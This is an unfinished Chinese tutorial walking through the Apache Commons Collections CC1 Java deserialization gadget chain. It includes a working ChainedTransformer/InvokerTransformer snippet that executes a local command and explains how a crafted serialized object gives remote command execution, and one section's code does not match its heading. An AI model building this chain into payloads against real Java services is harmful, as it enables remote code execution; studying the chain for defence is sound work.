### 一、**Apache Commons Collections反序列化漏洞**

`Apache Commons`是`Apache`开源的Java通用类项目在Java中项目中被广泛的使用，`Apache Commons`当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的`Collection（集合）`相关类对象。本节将逐步详解`Collections`反序列化攻击链(仅以`TransformedMap`调用链为示例)最终实现反序列化`RCE`。（本节讲述的也只是Apache Commons Collections的一条调用链cc1链 ）

### 二、**Transformer**

​	`Transformer`是一个接口类，提供了一个对象转换方法`transform`，源码如下：

```java
public interface Transformer {

    /**
     * 将输入对象（保持不变）转换为某个输出对象。
     *
     * @param input  需要转换的对象，应保持不变
     * @return 一个已转换的对象
     * @throws ClassCastException (runtime) 如果输入是错误的类
     * @throws IllegalArgumentException (runtime) 如果输入无效
     * @throws FunctorException (runtime) 如果转换无法完成
     */
    public Object transform(Object input);

}
```

该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap` 。

### **三、ConstantTransformer**

`ConstantTransformer`类是`Transformer`接口其中的一个实现类，`ConstantTransformer`类重写了`transformer`方法，源码如下：

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;

import org.apache.commons.collections.Transformer;

public class ConstantTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = 6374440726369055124L;

    /** 每次都返回null */
    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);

    /** The closures to call in turn */
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        if (constantToReturn == null) {
            return NULL_INSTANCE;
        }

        return new ConstantTransformer(constantToReturn);
    }

    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }

    public Object getConstant() {
        return iConstant;
    }

}
```

上面代码其实很清晰了，在于是将输入转换为一个预定义的常量。ConstantTransformer`，常量转换，转换的逻辑也非常的简单：传入对象不会经过任何改变直接返回。例如传入`Runtime.class`进行转换返回的依旧是`Runtime.class。

**示例 - ConstantTransformer：**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.functors.ConstantTransformer;

public class ConstantTransformerTest {

   public static void main(String[] args) {
      Object              obj         = Runtime.class;
      ConstantTransformer transformer = new ConstantTransformer(obj);
      System.out.println(transformer.transform(obj));
   }

}
```

程序执行结果：`class java.lang.Runtime`。

### **四、InvokerTransformer**

在`Collections`组件中提供了一个非常重要的类: `org.apache.commons.collections.functors.InvokerTransformer`，这个类实现了`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化`RCE`，并提供了利用方法：[CommonsCollections1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)。

`InvokerTransformer`类`transform`方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。

```java
public class InvokerTransformer implements Transformer, Serializable {

    private static final long serialVersionUID = -8653385846894047688L;

    /** 要调用的方法名称 */
    private final String iMethodName;

    /** 反射参数类型数组 */
    private final Class[] iParamTypes;

    /** 反射参数值数组 */
    private final Object[] iArgs;

    // 省去多余的方法和变量

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }

        try {
              // 获取输入类的类对象
            Class cls = input.getClass();

              // 通过输入的方法名和方法参数，获取指定的反射方法对象
            Method method = cls.getMethod(iMethodName, iParamTypes);

              // 反射调用指定的方法并返回方法调用结果
            return method.invoke(input, iArgs);
        } catch (Exception ex) {
            // 省去异常处理部分代码
        }
    }
}
```

上述实例演示了通过`InvokerTransformer`的反射机制来调用`java.lang.Runtime`来实现命令执行，但在真实的漏洞利用场景我们是没法在调用`transformer.transform`的时候直接传入`Runtime.getRuntime()`对象的，因此我们需要学习如何通过`ChainedTransformer`来创建攻击链。<font color="red">上面一个类最关键是没有解决输入的问题，InvokerTransformer并没有从外直接可控的参数</font>



### **五、ChainedTransformer** 

 

```java
public class DeserializationTest implements Serializable {

/**
     * 自定义反序列化类对象
     *
     * @param ois 反序列化输入流对象
     * @throws IOException            IO异常
     * @throws ClassNotFoundException 类未找到异常
     */
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        System.out.println("readObject...");

        // 调用ObjectInputStream默认反序列化方法
        ois.defaultReadObject();

        // 省去调用自定义反序列化逻辑...
    }

    /**
     * 自定义序列化类对象
     *
     * @param oos 序列化输出流对象
     * @throws IOException IO异常
     */
    private void writeObject(ObjectOutputStream oos) throws IOException {
        oos.defaultWriteObject();

        System.out.println("writeObject...");
        // 省去调用自定义序列化逻辑...
    }

    private void readObjectNoData() {
        System.out.println("readObjectNoData...");
    }

    /**
     * 写入时替换对象
     *
     * @return 替换后的对象
     */
    protected Object writeReplace() {
        System.out.println("writeReplace....");

        return null;
    }

    protected Object readResolve() {
        System.out.println("readResolve....");

        return null;
    }

}
```

通过构建`ChainedTransformer`调用链，最终间接的使用`InvokerTransformer`完成了反射调用`Runtime.getRuntime().exec(cmd)`的逻辑。

我们可以通过动态调试细看具体的逻辑如何

打断点

![image-20230613115138091](image/十一、Apache Commons Collections反序列化漏洞/image-20230613115138091.png)

走到ChainedTransformer中的transform方法，可以看到此时object为null

![image-20230613115333271](image/十一、Apache Commons Collections反序列化漏洞/image-20230613115333271.png)

此时执行的就是Transformer数组中的第一个，new ConstantTransformer(Runtime.class)的Transformer方法，同时返回了runtime的class对象

![image-20230613120157671](image/十一、Apache Commons Collections反序列化漏洞/image-20230613120157671.png)

object值此时已经变为java.lang.Runtime,同时这个也传入下一个transformer的数组的对象。

```java
InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				)
```

![image-20230613152545136](image/十一、Apache Commons Collections反序列化漏洞/image-20230613152545136.png)

下面显而易见开始执行InvokerTransformer的Transformer方法执行的结果就是调用了runtime.getruntime

![image-20230613153214846](image/十一、Apache Commons Collections反序列化漏洞/image-20230613153214846.png)



后面发现直接传入两个数组也能执行命令，很可能这种特殊的传递链条和下面参数的入口有很大关系。下面是穿两个的代码

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections2Test {

    public static void main(String[] args) throws Exception {
        // 定义需要执行的本地系统命令
        String cmd = "notepad";

        // ChainedTransformer调用链分解

//		// new ConstantTransformer(Runtime.class
//		Class<?> runtimeClass = Runtime.class;
//
//		// new InvokerTransformer("getMethod", new Class[]{
//		// 		String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
//		// ),
//		Class  cls1       = runtimeClass.getClass();
//		Method getMethod  = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
//		Method getRuntime = (Method) getMethod.invoke(runtimeClass, new Object[]{"getRuntime", new Class[0]});
//
//		// new InvokerTransformer("invoke", new Class[]{
//		// 		Object.class, Object[].class}, new Object[]{null, new Object[0]}
//		// )
//		Class   cls2         = getRuntime.getClass();
//		Method  invokeMethod = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
//		Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]});
//
//		// new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
//		Class  cls3       = runtime.getClass();
//		Method execMethod = cls3.getMethod("exec", new Class[]{String.class});
//		execMethod.invoke(runtime, cmd);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 执行对象转换操作
        Object transform = transformedChain.transform(null);

        System.out.println(transform);
    }

    }

```



### 六、利用`InvokerTransformer`执行本地命令

上面两个Demo为我们演示了如何使用`InvokerTransformer`执行本地命令，现在我们也就还只剩下两个问题：

1.如何传入调用链

2.如何调用其中的transformer方法

现在我们已经使用`InvokerTransformer`创建了一个含有恶意调用链的`Transformer`类的Map对象，紧接着我们应该思考如何才能够将调用链串起来并执行。

`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对`Map`的`key`或者`value`进行`Transformer`转换（<font color="red">这个transformer转换不太能理解</font>）

 以上是关于Transformer转换的gtp理解

这个类主要通过装饰器模式来实现，即将原本的 Map 对象传入 TransformedMap 中进行包装，然后再返回一个新的 Map 对象，从而实现了对 key 或者 value 的转换。例如：

```java
Map<String, String> originalMap = new HashMap<>();
originalMap.put("name", "Alice");
originalMap.put("age", "20");

Transformer<String, Integer> transformer = new Transformer<String, Integer>() {
    @Override
    public Integer transform(String input) {
        return Integer.parseInt(input);
    }
};

Map<String, Integer> transformedMap = TransformedMap.decorate(originalMap, null, transformer);

Integer age = transformedMap.get("age"); // 此处会自动将字符串 "20" 转换为整数 20

```

一个很有意思的例子，可以看到的是通过transformer 的一匿名内部类，里面设置了一个此处会自动将字符串转换为整数 。TransformedMap.decorate可以通过传入transformer的类在下面调用，下面可以看到调用map自带的get方法就能调用此方法。

（<font color="red">这个方法确实使用了装饰器模式来对 Map 进行包装，从而在不修改原有 Map 的基础上提供一些新的功能。具体地说，它返回一个由指定的 Map 和转换函数组成的新 Map，其中通过转换函数对键和值进行转换</font>）



同时这里解释一下java装饰器模式，它允许你在运行时动态的向一个对象添加额外的功能。这个模式通常用于避免使用继承来实现类似的功能，因为继承回导致代码的复杂性增加。（这是一种设计模式用巧妙的方法实现了类似动态代理的效果）

```java
package com.anbai.sec.serializes;

interface Component {
    void operation();
}

class ConcreteComponent implements Component {
    public void operation() {
        System.out.println("ConcreteComponent.operation()");
    }
}

abstract class Decorator implements Component {
    protected Component component;

    public Decorator(Component component) {
        this.component = component;
    }

    public void operation() {
        component.operation();
    }
}

class ConcreteDecoratorA extends Decorator {
    public ConcreteDecoratorA(Component component) {
        super(component);
    }

    public void operation() {
        super.operation();
        System.out.println("ConcreteDecoratorA.operation()");
    }
}

class ConcreteDecoratorB extends Decorator {
    public ConcreteDecoratorB(Component component) {
        super(component);
    }

    public void operation() {
        super.operation();
        System.out.println("ConcreteDecoratorB.operation()");
    }
}

public class TestDecorator {
    public static void main(String[] args) {
        Component component = new ConcreteComponent();
        component = new ConcreteDecoratorA(component);
        component.operation();
    }
}


```



### **七、`AnnotationInvocationHandler`**

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(`Java动态代理`)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用。(<font color="red">主要是其重写了readObject方法</font>)

```
package sun.reflect.annotation;

class AnnotationInvocationHandler implements InvocationHandler, Serializable {

  AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    // 省去代码部分
  }

  // Java动态代理的invoke方法
  public Object invoke(Object var1, Method var2, Object[] var3) {
    // 省去代码部分
  }

  private void readObject(ObjectInputStream var1) {
      // 省去代码部分
  }

}
```

**`readObject`方法:**

![image-20191220181251898](image/十一、Apache Commons Collections反序列化漏洞/image-20191220181251898.png)

上图中的第`352`行中的`memberValues`是`AnnotationInvocationHandler`的成员变量，`memberValues`的值是在`var1.defaultReadObject();`时反序列化生成的，它也就是我们在创建`AnnotationInvocationHandler`时传入的带有恶意攻击链的`TransformedMap`。需要注意的是如果我们想要进入到`var5.setValue`这个逻辑那么我们的序列化的`map`中的`key`必须包含创建`AnnotationInvocationHandler`时传入的注解的方法名。

既然利用`AnnotationInvocationHandler`类我们可以实现反序列化`RCE`，那么在序列化`AnnotationInvocationHandler`对象的时候传入我们精心构建的包含了恶意攻击链的`TransformedMap`对象的序列化字节数组给远程服务，对方在反序列化`AnnotationInvocationHandler`类的时候就会触发整个恶意的攻击链，从而也就实现了远程命令执行了。

**创建`AnnotationInvocationHandler`对象：**

因为`sun.reflect.annotation.AnnotationInvocationHandler`是一个内部API专用的类，在外部我们无法通过类名创建出`AnnotationInvocationHandler`类实例，所以我们需要通过反射的方式创建出`AnnotationInvocationHandler`对象：





（没写完摆烂了以后补上）